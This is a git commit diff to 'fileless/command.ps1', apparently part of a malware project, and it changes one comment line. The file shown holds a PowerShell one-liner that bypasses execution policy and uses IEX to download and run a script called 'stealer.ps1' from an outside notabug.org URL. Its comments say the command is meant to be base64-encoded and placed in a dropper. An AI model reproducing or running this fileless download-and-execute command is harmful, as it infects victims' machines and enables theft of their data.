eb72f3b8a897f9e68c91ea99584d69f53c8f8466
1d8 <56985822+1d8@users.noreply.github.com>
2020-07-04 19:44:42 -0700

    Update command.ps1

--- fileless/command.ps1
+++ fileless/command.ps1
@@ -1,5 +1,5 @@
 # This command will grab & execute the stealer.ps1 code without actually 
-# downloading the exe
+# downloading the powershell script onto disk
 # You will encode this cmd with base64 & add it to the dropper.c file
 powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://notabug.org/bennythamanman/jacaccacac/raw/master/stealer.ps1')
 
